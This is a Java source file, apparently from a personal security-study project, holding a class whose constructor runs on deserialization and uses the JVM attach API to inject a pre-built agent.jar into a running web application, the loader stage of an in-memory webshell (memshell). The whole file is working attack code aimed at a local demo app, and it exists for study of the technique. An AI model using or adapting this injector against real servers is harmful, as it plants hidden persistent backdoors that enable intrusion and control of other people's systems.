// 在反序列化时通过初始化执行的类，用于注入agent，需要提前写入agent.jar
public class DeserClass {
    public DeserClass() {
        try{
            System.out.println("start load agent...");
            java.lang.String path = "D:\\BaiduSyncdisk\\code\\MyJavaSecStudy\\memshell\\Agent\\Demo\\target\\agent-1.0-SNAPSHOT.jar";
            java.io.File toolsPath = new java.io.File(System.getProperty("java.home").replace("jre","lib") + java.io.File.separator + "tools.jar");
            java.net.URL url = toolsPath.toURI().toURL();
            java.net.URLClassLoader classLoader = new java.net.URLClassLoader(new java.net.URL[]{url});
            Class/*<?>*/ MyVirtualMachine = classLoader.loadClass("com.sun.tools.attach.VirtualMachine");
            Class/*<?>*/ MyVirtualMachineDescriptor = classLoader.loadClass("com.sun.tools.attach.VirtualMachineDescriptor");
            java.lang.reflect.Method listMethod = MyVirtualMachine.getDeclaredMethod("list",null);
            java.util.List/*<Object>*/ list = (java.util.List/*<Object>*/) listMethod.invoke(MyVirtualMachine,null);

            System.out.println("Running JVM list ...");
            for(int i=0;i<list.size();i++){
                Object o = list.get(i);
                java.lang.reflect.Method displayName = MyVirtualMachineDescriptor.getDeclaredMethod("displayName",null);
                java.lang.String name = (java.lang.String) displayName.invoke(o,null);
                // 列出当前有哪些 JVM 进程在运行
                // 这里的 if 条件根据实际情况进行更改
                if (name.contains("com.WebDemoApplication")){
                    // 获取对应进程的 pid 号
                    java.lang.reflect.Method getId = MyVirtualMachineDescriptor.getDeclaredMethod("id",null);
                    java.lang.String id = (java.lang.String) getId.invoke(o,null);
                    System.out.println("id >>> " + id);
                    java.lang.reflect.Method attach = MyVirtualMachine.getDeclaredMethod("attach",new Class[]{java.lang.String.class});
                    java.lang.Object vm = attach.invoke(o,new Object[]{id});
                    java.lang.reflect.Method loadAgent = MyVirtualMachine.getDeclaredMethod("loadAgent",new Class[]{java.lang.String.class});
                    loadAgent.invoke(vm,new Object[]{path});
                    java.lang.reflect.Method detach = MyVirtualMachine.getDeclaredMethod("detach",null);
                    detach.invoke(vm,null);
                    System.out.println("Agent.jar Inject Success !!");
                    break;
                }
            }
        } catch (Exception e){
            e.printStackTrace();
        }
    }
}
